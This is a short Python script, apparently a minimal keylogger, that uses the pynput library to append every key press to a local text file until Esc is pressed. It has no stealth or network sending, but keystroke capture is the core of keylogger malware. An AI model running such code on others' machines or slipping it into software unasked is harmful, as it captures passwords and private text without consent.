import pynput
from pynput.keyboard import Key, Listener

log_file = "keystrokes.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key}\n")
    except Exception as e:
        print(f"Error writing to log file: {e}")

def on_release(key):
    if key == Key.esc:
        return False

def main():
    try:
        with Listener(on_press=on_press, on_release=on_release) as listener:
            listener.join()
    except Exception as e:
        print(f"Error in listener: {e}")

if __name__ == "__main__":
    main()